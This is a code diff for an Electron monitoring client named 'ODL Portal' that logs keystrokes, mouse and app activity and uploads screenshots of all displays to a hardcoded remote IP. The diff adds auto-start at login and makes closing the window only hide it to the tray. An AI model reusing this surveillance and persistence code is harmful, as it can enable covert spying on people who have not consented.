@@ -11,6 +11,7 @@ const { uIOhook, UiohookKey } = require('uiohook-napi');
 const { exec } = require('child_process');
 const util = require('util');
 const execPromise = util.promisify(exec);
+const AutoLaunch = require('auto-launch');
 
 // Load environment variables based on command line argument or NODE_ENV
 const args = process.argv.slice(1);
@@ -29,7 +30,21 @@ if (fs.existsSync(envFile)) {
   });
 }
 
-const SERVER_URL = process.env.SERVER_URL || 'http://localhost:4000';
+const SERVER_URL = process.env.SERVER_URL || 'http://103.130.11.114:3001';
+
+// Configure auto-launch
+const autoLauncher = new AutoLaunch({
+  name: 'ODL Portal',
+  path: app.getPath('exe'),
+});
+
+// Enable auto-launch on startup
+autoLauncher.isEnabled().then((isEnabled) => {
+  if (!isEnabled) autoLauncher.enable();
+}).catch((err) => {
+  console.error('Auto-launch error:', err);
+});
+
 let mainWindow = null;
 let tray = null;
 let socket = null;
@@ -42,7 +57,8 @@ let currentSettings = {
   screenshotEnabled: true,
   screenshotInterval: 6000,
   streamingEnabled: true,
-  doubleScreenEnabled: false
+  doubleScreenEnabled: false,
+  screenShowEnabled: true
 };
 let mouseTrackingData = {
   sessionId: null,
@@ -90,38 +106,29 @@ async function getDeviceIdentifier() {
 }
 
 async function createWindow() {
+  const { nativeImage } = require('electron');
+  const iconPath = path.join(__dirname, 'assets', 'octopi-logo.webp');
+  
   mainWindow = new BrowserWindow({
     width: 320,
-    height: 400,
+    height: 220,
+    icon: iconPath,
+    autoHideMenuBar: true,
     webPreferences: {
       nodeIntegration: true,
       contextIsolation: false
     }
   });
 
+  // Remove the menu bar completely
+  mainWindow.setMenu(null);
+
   mainWindow.loadFile('index.html');
   
   mainWindow.on('close', (event) => {
     event.preventDefault();
-    const { dialog } = require('electron');
-    const choice = dialog.showMessageBoxSync(mainWindow, {
-      type: 'question',
-      buttons: ['Minimize to System', 'Exit Application', 'Cancel'],
-      title: 'Confirm Action',
-      message: 'What would you like to do?',
-      defaultId: 0,
-      cancelId: 2
-    });
-    
-    if (choice === 0) {
-      // Minimize to tray
-      mainWindow.hide();
-    } else if (choice === 1) {
-      // Exit application
-      cleanup();
-      app.quit();
-    }
-    // choice === 2 means cancel, do nothing
+    // Automatically minimize to system tray
+    mainWindow.hide();
   });
 
   mainWindow.on('closed', () => {
@@ -169,19 +176,20 @@ async function checkDeviceRegistration() {
         const settingsResponse = await axios.get(`${SERVER_URL}/api/settings`);
         if (settingsResponse.data.success) {
           currentSettings = { ...currentSettings, ...settingsResponse.data.settings };
-          console.log('Loaded settings:', currentSettings);
+          console.log('✅ Loaded global settings:', currentSettings);
         }
       } catch (error) {
         console.error('Failed to fetch settings:', error.message);
       }
       
-      // Start all tracking
+      // Start tracking that doesn't depend on settings
       startAppTracking();
-      startScreenshotCapture();
       startMouseTracking();
       startKeystrokeTracking();
       
-      // Connect to socket
+      // Connect to socket first - it will send user-specific settings
+      // Screenshot capture will be started after receiving settings via socket
+      console.log('🔌 Connecting to socket...');
       connectSocket();
     } else {
       // Device not registered, show login screen
@@ -246,7 +254,48 @@ function connectSocket() {
     });
 
     socket.on('settings_updated', (newSettings) => {
+      console.log('📥 Received settings_updated:', newSettings);
+      const isInitialSettings = !screenshotInterval && newSettings.screenShowEnabled !== undefined;
       handleSettingsUpdate(newSettings);
+      
+      // Start screenshot capture on initial settings if not already running
+      if (isInitialSettings && currentUser && currentSettings.screenshotEnabled && currentSettings.screenShowEnabled) {
+        console.log('🚀 Starting screenshot capture with initial settings');
+        startScreenshotCapture();
+      }
+    });
+
+    socket.on('screen_show_updated', (data) => {
+      const wasEnabled = currentSettings.screenShowEnabled;
+      currentSettings.screenShowEnabled = data.screenShowEnabled;
+      
+      console.log(`📺 Screen show updated: ${data.screenShowEnabled ? 'ENABLED' : 'DISABLED'}`);
+      
+      // Update UI
+      if (mainWindow && !mainWindow.isDestroyed()) {
+        mainWindow.webContents.send('status-update', {
+          isOnline: true,
+          screenshotEnabled: currentSettings.screenshotEnabled,
+          screenshotInterval: currentSettings.screenshotInterval,
+          streamingEnabled: currentSettings.streamingEnabled,
+          doubleScreenEnabled: currentSettings.doubleScreenEnabled,
+          screenShowEnabled: currentSettings.screenShowEnabled
+        });
+      }
+      
+      // Handle screenshot capture based on new setting
+      if (data.screenShowEnabled && !wasEnabled) {
+        // Re-enabled: Start screenshot capture if screenshots are enabled
+        if (currentSettings.screenshotEnabled && currentUser) {
+          console.log('🔄 Restarting screenshot capture after screen show enabled');
+          startScreenshotCapture();
+        }
+      } else if (!data.screenShowEnabled && screenshotInterval) {
+        // Disabled: Stop screenshot capture
+        console.log('⏸️ Stopping screenshot capture (screen show disabled)');
+        clearInterval(screenshotInterval);
+        screenshotInterval = null;
+      }
     });
 
     socket.on('disconnect', () => {
@@ -314,7 +363,7 @@ function startStreamHandler(data) {
 
 // Screenshot handler
 function startScreenshotHandler(data) {
-  if (!currentSettings.screenshotEnabled) {
+  if (!currentSettings.screenshotEnabled || !currentSettings.screenShowEnabled) {
     return;
   }
 
@@ -355,15 +404,16 @@ function handleSettingsUpdate(newSettings) {
       clearInterval(screenshotInterval);
       screenshotInterval = null;
       
-      if (currentSettings.screenshotEnabled) {
+      if (currentSettings.screenshotEnabled && currentSettings.screenShowEnabled) {
         startScreenshotHandler({ interval: currentSettings.screenshotInterval });
       }
     }
   }
 
-  // Handle screenshot enabled/disabled
-  if (oldSettings.screenshotEnabled !== currentSettings.screenshotEnabled) {
-    if (currentSettings.screenshotEnabled) {
+  // Handle screenshot enabled/disabled or screenShowEnabled change
+  if (oldSettings.screenshotEnabled !== currentSettings.screenshotEnabled || 
+      oldSettings.screenShowEnabled !== currentSettings.screenShowEnabled) {
+    if (currentSettings.screenshotEnabled && currentSettings.screenShowEnabled) {
       startScreenshotHandler({ interval: currentSettings.screenshotInterval });
     } else {
       if (screenshotInterval) {
@@ -379,7 +429,8 @@ function handleSettingsUpdate(newSettings) {
       isOnline: socket && socket.connected,
       screenshotEnabled: currentSettings.screenshotEnabled,
       screenshotInterval: currentSettings.screenshotInterval,
-      streamingEnabled: currentSettings.streamingEnabled
+      streamingEnabled: currentSettings.streamingEnabled,
+      screenShowEnabled: currentSettings.screenShowEnabled
     });
   }
 }
@@ -730,18 +781,51 @@ async function captureAndUploadScreenshot() {
       return;
     }
 
-    const imgBuffer = await screenshot({ format: 'jpeg' });
-    const base64Image = imgBuffer.toString('base64');
+    const displays = screen.getAllDisplays();
+    console.log(`[Screenshot Debug] doubleScreenEnabled: ${currentSettings.doubleScreenEnabled}, displays: ${displays.length}`);
     
-    // Upload to server
-    const response = await axios.post(`${SERVER_URL}/api/screenshots`, {
-      userId: currentUser.userId || currentUser.id,
-      deviceId: currentUser.deviceId,
-      username: currentUser.username,
-      computerName: currentUser.computerName,
-      imageData: `data:image/jpeg;base64,${base64Image}`
-    });
-    console.log('✓ Screenshot uploaded successfully');
+    // Check if dual screen is enabled and multiple displays exist
+    if (currentSettings.doubleScreenEnabled && displays.length > 1) {
+      console.log('[Screenshot Debug] Capturing multiple screens...');
+      // Capture all screens
+      const screens = await screenshot.listDisplays();
+      
+      for (let i = 0; i < screens.length; i++) {
+        try {
+          const imgBuffer = await screenshot({ screen: screens[i].id, format: 'jpeg' });
+          const base64Image = imgBuffer.toString('base64');
+          
+          // Upload each screen separately
+          await axios.post(`${SERVER_URL}/api/screenshots`, {
+            userId: currentUser.userId || currentUser.id,
+            deviceId: currentUser.deviceId,
+            username: currentUser.username,
+            computerName: currentUser.computerName,
+            imageData: `data:image/jpeg;base64,${base64Image}`,
+            screenIndex: i,
+            totalScreens: screens.length
+          });
+          console.log(`✓ Screenshot uploaded successfully (Screen ${i + 1}/${screens.length})`);
+        } catch (screenError) {
+          console.error(`✗ Failed to upload screenshot for screen ${i}:`, screenError.response?.data || screenError.message);
+        }
+      }
+    } else {
+      console.log('[Screenshot Debug] Capturing single screen only');
+      // Capture only primary screen
+      const imgBuffer = await screenshot({ format: 'jpeg' });
+      const base64Image = imgBuffer.toString('base64');
+      
+      // Upload to server
+      await axios.post(`${SERVER_URL}/api/screenshots`, {
+        userId: currentUser.userId || currentUser.id,
+        deviceId: currentUser.deviceId,
+        username: currentUser.username,
+        computerName: currentUser.computerName,
+        imageData: `data:image/jpeg;base64,${base64Image}`
+      });
+      console.log('✓ Screenshot uploaded successfully');
+    }
   } catch (error) {
     console.error('✗ Failed to upload screenshot:', error.response?.data || error.message);
   }
@@ -749,21 +833,32 @@ async function captureAndUploadScreenshot() {
 
 // Function to start screenshot capture with current settings
 function startScreenshotCapture() {
+  console.log('📸 startScreenshotCapture called');
+  console.log('   - screenshotEnabled:', currentSettings.screenshotEnabled);
+  console.log('   - screenShowEnabled:', currentSettings.screenShowEnabled);
+  console.log('   - screenshotInterval:', currentSettings.screenshotInterval);
+  console.log('   - currentUser:', currentUser ? 'YES' : 'NO');
+  
   // Stop existing interval if any
   if (screenshotInterval) {
+    console.log('   - Clearing existing screenshot interval');
     clearInterval(screenshotInterval);
     screenshotInterval = null;
   }
 
-  if (!currentSettings.screenshotEnabled) {
+  if (!currentSettings.screenshotEnabled || !currentSettings.screenShowEnabled) {
+    console.log('   ⚠️ Screenshot capture NOT started (disabled)');
     return;
   }
+  
+  console.log('   ✅ Starting screenshot capture...');
   
   // Take first screenshot immediately
   captureAndUploadScreenshot();
   
   // Then continue at the specified interval
   screenshotInterval = setInterval(captureAndUploadScreenshot, currentSettings.screenshotInterval);
+  console.log('   ✅ Screenshot interval set:', currentSettings.screenshotInterval, 'ms');
 }
 
 // Function to handle settings updates from admin
@@ -771,11 +866,16 @@ function handleSettingsUpdate(settings) {
   const oldSettings = { ...currentSettings };
   currentSettings = { ...currentSettings, ...settings };
 
+  console.log('⚙️ Settings updated:', settings);
+
   // Handle screenshot settings changes
   if (oldSettings.screenshotEnabled !== currentSettings.screenshotEnabled ||
-      oldSettings.screenshotInterval !== currentSettings.screenshotInterval) {
+      oldSettings.screenshotInterval !== currentSettings.screenshotInterval ||
+      oldSettings.screenShowEnabled !== currentSettings.screenShowEnabled ||
+      oldSettings.doubleScreenEnabled !== currentSettings.doubleScreenEnabled) {
     
     if (currentUser) {
+      console.log('🔄 Restarting screenshot capture with new settings');
       startScreenshotCapture();
     }
   }
@@ -796,7 +896,8 @@ function handleSettingsUpdate(settings) {
       screenshotEnabled: currentSettings.screenshotEnabled,
       screenshotInterval: currentSettings.screenshotInterval,
       streamingEnabled: currentSettings.streamingEnabled,
-      doubleScreenEnabled: currentSettings.doubleScreenEnabled
+      doubleScreenEnabled: currentSettings.doubleScreenEnabled,
+      screenShowEnabled: currentSettings.screenShowEnabled
     });
   }
 }
@@ -1560,14 +1661,14 @@ async function cleanup() {
 function createTray() {
   const { nativeImage } = require('electron');
   
-  // Try to use icon from build folder
-  const iconPath = path.join(__dirname, 'build', 'icon.png');
+  // Use octopi-logo.webp from assets folder
+  const iconPath = path.join(__dirname, 'assets', 'octopi-logo.webp');
   let trayIcon;
   
   if (fs.existsSync(iconPath)) {
     trayIcon = nativeImage.createFromPath(iconPath);
   } else {
-    // Create a simple 16x16 placeholder icon
+    // Create a simple placeholder icon
     trayIcon = nativeImage.createEmpty();
   }
   
@@ -1575,7 +1676,7 @@ function createTray() {
   
   const contextMenu = Menu.buildFromTemplate([
     {
-      label: 'Show ODL Portal',
+      label: 'Show',
       click: () => {
         if (mainWindow) {
           mainWindow.show();
@@ -1584,7 +1685,7 @@ function createTray() {
       }
     },
     {
-      label: 'Hide ODL Portal',
+      label: 'Hide',
       click: () => {
         if (mainWindow) {
           mainWindow.hide();
@@ -1592,12 +1693,8 @@ function createTray() {
       }
     },
     {
-      type: 'separator'
-    },
-    {
       label: 'Exit',
-      click: async () => {
-        await cleanup();
+      click: () => {
         app.quit();
       }
     }
@@ -1619,7 +1716,25 @@ function createTray() {
   });
 }
 
-app.whenReady().then(createWindow);
+// Single instance lock - prevent multiple instances
+const gotTheLock = app.requestSingleInstanceLock();
+
+if (!gotTheLock) {
+  // Another instance is already running, quit this one
+  app.quit();
+} else {
+  // Handle second instance attempt
+  app.on('second-instance', (event, commandLine, workingDirectory) => {
+    // Someone tried to run a second instance, focus our window instead
+    if (mainWindow) {
+      if (mainWindow.isMinimized()) mainWindow.restore();
+      if (!mainWindow.isVisible()) mainWindow.show();
+      mainWindow.focus();
+    }
+  });
+
+  app.whenReady().then(createWindow);
+}
 
 app.on('window-all-closed', () => {
   // Don't quit the app when all windows are closed (keep running in tray)
